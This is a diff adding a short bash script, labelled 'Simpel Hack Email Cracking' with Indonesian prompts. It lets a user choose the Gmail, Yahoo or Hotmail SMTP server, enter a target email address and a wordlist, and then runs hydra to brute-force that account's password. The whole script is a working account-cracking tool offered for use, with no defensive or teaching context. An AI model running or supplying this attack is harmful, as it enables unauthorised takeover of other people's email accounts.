@@ -1,0 +1,48 @@
+#!/bin/bash
+ 
+# Declare variable choice and assign value 4
+choice=4
+# Print to stdout
+echo "$(tput setaf 1)$(tput setab 7)#############################################$(tput sgr 0)"
+echo "$(tput setaf 1)$(tput setab 7)#$(tput sgr 0)$(tput setaf 2)	    Simpel Hack Email Cracking	    $(tput setaf 1)$(tput setab 7)#$(tput sgr 0)"
+echo "$(tput setaf 1)$(tput setab 7)#$(tput sgr 0)$(tput setaf 4)		Wrote By : sarzafi	    $(tput setaf 1)$(tput setab 7)#$(tput sgr 0)"
+echo "$(tput setaf 1)$(tput setab 7)#$(tput sgr 0)$(tput setaf 5)	NOTE: Gunakan Wordlist yang JITU !  $(tput setaf 1)$(tput setab 7)#$(tput sgr 0)"
+echo "$(tput setaf 1)$(tput setab 7)#############################################$(tput sgr 0) $(tput setaf 6)\n\n" 
+ echo "$(tput setaf 0)$(tput setab 4) 1. Google$(tput sgr 0)"
+ echo "$(tput setaf 0)$(tput setab 6) 2. Yahoo$(tput sgr 0)"
+ echo "$(tput setaf 0)$(tput setab 1) 3. Hotmail$(tput sgr 0)"
+ echo -n "Pilih SMTP [1,2 dan 3]? "
+# Loop while the variable choice is equal 4
+# bash while loop
+while [ $choice -eq 4 ]; do
+ 
+# read user input
+read choice
+# bash nested if/else
+if [ $choice -eq 1 ] ; then
+ 
+        smtp=smtp.gmail.com
+
+else                   
+
+        if [ $choice -eq 2 ] ; then
+	smtp=smtp.mail.yahoo.com
+        else
+         
+                if [ $choice -eq 3 ] ; then
+		smtp=smtp.live.com
+                else
+ echo "1. Google"
+ echo "2. Yahoo"
+ echo "3. Hotmail"
+ echo -n "Pilih SMTP [1,2 dan 3]? "
+                        choice=4
+                fi   
+        fi
+fi
+done 
+echo "Masukkan Email Target Contoh [xxxx@gmail.com]"
+read email
+echo "Masukkan Wordlist Beserta Lokasi Path nya ,Contoh [/root/Documents/wordlist.txt]"
+read wordlist
+hydra -S -l $email -P $wordlist -e ns -V -s 465 $smtp smtp
